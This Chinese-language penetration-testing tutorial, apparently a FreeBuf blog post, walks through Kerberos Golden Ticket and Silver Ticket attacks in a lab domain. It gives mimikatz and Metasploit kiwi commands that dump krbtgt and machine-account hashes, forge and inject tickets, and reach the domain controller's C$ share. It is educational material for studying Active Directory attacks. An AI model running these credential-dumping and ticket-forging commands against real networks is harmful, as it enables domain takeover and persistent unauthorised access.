## 前言

往期文章：

[《内网渗透测试：Kerberos 协议与 Kerberos
认证原理》](https://www.freebuf.com/articles/network/273725.html%20)

在上一节中我们说到过，Kerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的
MS14-068、黄金票据、白银票据等就是基于Kerberos协议进行攻击的。下面我们便详细的讲解一下 Kerberos 认证中的相关安全问题。

> 文中若有不当之处还请各位大佬多多点评
>
> 我的博客：<https://whoamianony.top/>

## 黄金票据（Golden ticket）

在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM
哈希作为密钥进行加密，生成 TGT。那么如果获取到了 Krbtgt 的 NTLM 哈希值，不就可以伪造任意的 TGT 了吗。因为 Krbtgt
只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。

利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos
认证的任何服务。

攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：

> 需要伪造的域管理员用户名
>
> 完整的域名
>
> 域 SID
>
> krbtgt 的 NTLM 哈希值

实验环境如下：

![image-20210522120058315](https://image.3001.net/images/20210522/1621656351_60a8831f485d087d4ce91.png!small)

> 域成员主机：Windows 7
>
>   * IP：192.168.93.20
>
>   * 域名：whoamianony.org
>
>   * 用户名：bunny
>
>

>
> 域控制器：Windows Server 2012
>
>   * IP：192.168.93.30
>
>   * 域名：whoamianony.org
>
>   * 用户名：administrator
>
>

假设有这么一种情况，原先攻击机已拿到的域内所有的账户 Hash，包括 Krbtgt
这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt
密码，基于此条件，我们还能利用该票据重新获得域管理员权限。

### Mimikatz 下的利用

首先，我们登上域控，上传 mimikatz，然后执行如下命令抓取 krbtgt 用户的 Hash 值并获取域sid：

    
    
    privilege::debug  
    lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或 hash

![image-20210521085744602](https://image.3001.net/images/20210522/1621656351_60a8831faa7139cc99d1f.png!small)

得到 krbtgt 用户的 Hash 和 域 SID 分别为：

  * Hash 值：6be58bfcc0a164af2408d1d3bd313c2a

  * 域 SID：为 S-1-5-21-1315137663-3706837544-1429009142

然后，我们切换到普通域用户的机器Windows 7，用 mimikatz 生成名为 ticket.kirbi 的 TGT 凭证，用户名为
administrator：

    
    
    kerberos::golden /user:administrator /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ticket:ticket.kirbi  
    ​  
    # kerberos::golden /user:需要伪造的域管理员用户名 /domain:域名 /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi

![image-20210521090438038](https://image.3001.net/images/20210522/1621656352_60a883200597b26341b44.png!small)

如上图所示，成功生成 TGT 凭证 ticket.kirbi，名为 ticket.kirbi，然后使用 mimikatz 将凭证ticket.kirbi
注入进去：

    
    
    kerberos::ptt ticket.kirbi  
    #kerberos::ptt <票据文件>

![image-20210521090706436](https://image.3001.net/images/20210522/1621656352_60a88320658b0c6b3ccd2.png!small)

此时我们可以执行以下来查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：

    
    
    kerberos::tgt

![image-20210521091230421](https://image.3001.net/images/20210522/1621656352_60a88320a1c4dc5785e7d.png!small)

到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用 Windows 7 任意访问域控了：

    
    
    dir \\DC\c$

![image-20210521092047545](https://image.3001.net/images/20210522/1621656353_60a8832100f770157acaa.png!small)

也可以使用 psexec，wmi 等方法对域控进行远程执行命令：

![image-20210521092450447](https://image.3001.net/images/20210522/1621656353_60a8832166e385a349352.png!small)

可见，黄金票据可以当做一个安装在普通域成员主机上的连接到域控的后门。

### Metasploit 下的利用

在 Metasploit 中也有对应的利用模块。

首先我们需要让 Windows 7 上线一个 MSF 的会话：

![image-20210521110157111](https://image.3001.net/images/20210522/1621656353_60a88321ce11b559894c9.png!small)

然后再这个 meterpreter 中加载 kiwi 模块：

    
    
    load kiwi

![image-20210521110436981](https://image.3001.net/images/20210522/1621656354_60a88322a8242b8f33c96.png!small)

然后输入命令生成票据：

    
    
    golden_ticket_create -d whoamianony.org -k 6be58bfcc0a164af2408d1d3bd313c2a -s S-1-5-21-1315137663-3706837544-1429009142 -u administrator -t /root/krbtgt.ticket  
    # golden_ticket_create -d 域名 -k krbtgt用户的Hash -s 域sid -u 需要伪造的域管理员用户名 -t /root/krbtgt.ticket  
    ​  
    kerberos_ticket_list # 查看本地储存的票据  
    kerberos_ticket_use /root/krbtgt.ticket # 将票据注入内存

![image-20210521185512619](https://image.3001.net/images/20210522/1621656355_60a8832343a4cd78d1e35.png!small)

如上图所示，成功注入黄金票据，此时进入 Shell 中可以成功查看 DC 中的文件：

    
    
    dir \\DC\c$

![image-20210521185733508](https://image.3001.net/images/20210522/1621656356_60a88324480707f1a218d.png!small)

## 白银票据（Silver ticket）

白银票据不同于黄金票据，白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用
KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造的 TGT 得20分钟内，TGS 不会对该 TGT
的真伪进行效验。

白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 krbtgt 账号的密码哈希值，因此更加隐蔽。

攻击者要利用白银票据进行票据传递攻击时，需要掌握下面几个信息：

  * 域名

  * 域 SID

  * 目标服务器的 FQDN

  * 可利用的服务

  * 服务账号的 NTLM 哈希值

  * 要伪造的用户名

实验环境如下：

![image-20210522120058315](https://image.3001.net/images/20210522/1621656351_60a8831f485d087d4ce91.png!small)

> 域成员主机：Windows 7
>
>   * IP：192.168.93.20
>
>   * 域名：whoamianony.org
>
>   * 用户名：bunny
>
>

>
> 域控制器：Windows Server 2012
>
>   * IP：192.168.93.30
>
>   * 域名：whoamianony.org
>
>   * 用户名：administrator
>
>

下面我们就使用白银票据来伪造 CIFS 服务权限，CIFS 服务通常用于Windows 主机之间的文件共享。

首先登录域控，抓取机器账号的哈希值：

    
    
    privilege::debug  
    sekurlsa::logonpasswords

![image-20210521092929785](https://image.3001.net/images/20210522/1621656359_60a883276028680a912aa.png!small)

这里的 NTLM 和 SHA1 都可以用。得到计算机账号的哈希为：6decb5d75eb5727d8535e67680b52571

（注意是 DC$ 用户的 NTLM 哈希，不是 Administrator 用户，因为要利用共享服务账号）

然后切换到普通域用户机器 Windows 7 中，使用 mimikatz 生成伪造的白银票据：

    
    
    kerberos::golden /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /target:DC.whoamianony.org /rc4:6decb5d75eb5727d8535e67680b52571 /service:cifs /user:administrastor /ptt  
    ​  
    # kerberos::golden /domain:域名 /sid:域 SID /target:FQDN /rc4:server 机器的哈希 /service:可利用的服务 /user:要伪造的用户名 /ptt

注意这里的`/target`应为 FQDN 格式，即全称。

![image-20210521093612632](https://image.3001.net/images/20210522/1621656359_60a88327b54ca5dcb7b1b.png!small)

如上图所示，成功生成了伪造的白银票据，此时进行权限验证。如下，发现已经可以访问域控制器的共享目录了：

    
    
    dir \\DC.whoamianony.org\c$         // 机器名要全称，注意是全称

